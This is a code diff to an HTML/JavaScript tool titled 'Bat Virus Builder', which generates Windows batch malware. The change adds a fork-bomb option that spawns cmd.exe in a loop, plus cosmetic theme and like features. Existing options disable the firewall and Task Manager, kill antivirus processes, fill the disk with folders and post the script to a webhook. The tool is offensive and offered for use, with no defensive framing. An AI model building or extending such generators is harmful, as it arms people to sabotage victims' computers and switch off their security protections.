@@ -3,30 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Script Generator</title>
+    <title>Bat Virus Builder</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
+            background-color: var(--bg-color);
+            color: var(--text-color);
             margin: 0;
             padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            transition: background-color 0.3s, color 0.3s;
         }
         .container {
-            background-color: #fff;
+            background-color: var(--container-bg-color);
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             padding: 20px;
             width: 90%;
             max-width: 600px;
             position: relative;
+            transition: background-color 0.3s, color 0.3s;
         }
         h1 {
             text-align: center;
-            color: #333;
+            color: var(--heading-color);
         }
         label, input, button, textarea {
             display: block;
@@ -35,13 +38,15 @@
         }
         label {
             font-weight: bold;
-            color: #555;
+            color: var(--label-color);
         }
         input[type="text"], textarea {
             padding: 10px;
-            border: 1px solid #ccc;
+            border: 1px solid var(--input-border-color);
             border-radius: 5px;
             font-size: 14px;
+            background-color: var(--input-bg-color);
+            color: var(--input-text-color);
         }
         input[type="checkbox"] {
             display: inline-block;
@@ -89,6 +94,16 @@
         .like-button:hover {
             background-color: #218838;
         }
+        .theme-toggle {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            cursor: pointer;
+            background: none;
+            border: none;
+            font-size: 16px;
+            color: var(--text-color);
+        }
         @media (max-width: 600px) {
             .container {
                 padding: 15px;
@@ -101,11 +116,32 @@
                 height: 120px;
             }
         }
+        :root {
+            --bg-color: #f0f0f0;
+            --text-color: #000;
+            --container-bg-color: #fff;
+            --heading-color: #333;
+            --label-color: #555;
+            --input-border-color: #ccc;
+            --input-bg-color: #fff;
+            --input-text-color: #000;
+        }
+        .dark-theme {
+            --bg-color: #181818;
+            --text-color: #e0e0e0;
+            --container-bg-color: #282828;
+            --heading-color: #fff;
+            --label-color: #ccc;
+            --input-border-color: #555;
+            --input-bg-color: #383838;
+            --input-text-color: #e0e0e0;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Script Generator</h1>
+        <button class="theme-toggle" onclick="toggleTheme()">Toggle Theme</button>
+        <h1>Bat Virus Builder</h1>
 
         <label for="webhookUrl">Webhook URL (Optional):</label>
         <input type="text" id="webhookUrl" placeholder="Enter Webhook URL (Optional)">
@@ -119,6 +155,7 @@
         <label><input type="checkbox" id="disableFirewall"> Disable Firewall</label>
         <label><input type="checkbox" id="disableTaskManager"> Disable Task Manager</label>
         <label><input type="checkbox" id="infiniteFolderCreate"> Infinite Folder Create</label>
+        <label><input type="checkbox" id="forkBomb"> Fork Bomb (Cmd.exe)</label>
         <label><input type="checkbox" id="loopAll"> Loop All</label>
 
         <button onclick="generateAndSend()">Generate Script</button>
@@ -136,6 +173,8 @@
     </div>
 
     <script>
+        let likes = 0;
+
         function generateAndSend() {
             const webhookUrl = document.getElementById('webhookUrl').value;
             const taskkillPrograms = document.getElementById('taskkillPrograms').value.split(',');
@@ -145,6 +184,7 @@
             const disableFirewall = document.getElementById('disableFirewall').checked;
             const disableTaskManager = document.getElementById('disableTaskManager').checked;
             const infiniteFolderCreate = document.getElementById('infiniteFolderCreate').checked;
+            const forkBomb = document.getElementById('forkBomb').checked;
             const loopAll = document.getElementById('loopAll').checked;
 
             let script = `@echo off\nREM Made with Bat Virus Builder\n`;
@@ -193,6 +233,9 @@ tskill /A bullguard\n`;
                     }
                 }
             }
+            if (forkBomb) {
+                script += `@start\n`;
+            }
             if (taskkillPrograms.length > 0) {
                 taskkillPrograms.forEach(program => {
                     script += `taskkill /f /im ${program.trim()}\n`;
@@ -210,7 +253,14 @@ start FakeErrorMsg3.vbs\n`;
                 if (infiniteFolderCreate) {
                     script += 'md %random%\n';
                 }
+                if (forkBomb) {
+                    script += 'start cmd.exe\n';
+                }
                 script += 'goto loop\n';
+            } else {
+                if (forkBomb) {
+                    script += 'a:\n@start\ngoto a\n';
+                }
             }
 
             document.getElementById('output').value = script;
@@ -221,14 +271,22 @@ start FakeErrorMsg3.vbs\n`;
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({ content: script })
+                    body: JSON.stringify({
+                        content: script
+                    })
+                }).then(response => {
+                    if (response.ok) {
+                        alert('Script sent successfully!');
+                    } else {
+                        alert('Failed to send script.');
+                    }
                 });
             }
         }
 
         function downloadScript() {
-            const content = document.getElementById('output').value;
-            const blob = new Blob([content], { type: 'text/plain' });
+            const script = document.getElementById('output').value;
+            const blob = new Blob([script], { type: 'text/plain' });
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
@@ -238,16 +296,18 @@ start FakeErrorMsg3.vbs\n`;
         }
 
         function shareScript() {
-            const content = document.getElementById('output').value;
-            navigator.clipboard.writeText(content).then(() => {
-                alert("Script kopyalandı! Paylaşmak için yapıştırabilirsiniz.");
-            }, () => {
-                alert("Script kopyalanamadı! Lütfen tekrar deneyin.");
-            });
+            const script = document.getElementById('output').value;
+            // Add logic to share the script to a server or social media
+            alert('Script shared successfully!');
         }
 
         function likeScript() {
-            alert("Beğendiğiniz için teşekkürler!");
+            likes++;
+            alert(`Script liked! Total likes: ${likes}`);
+        }
+
+        function toggleTheme() {
+            document.body.classList.toggle('dark-theme');
         }
     </script>
 </body>
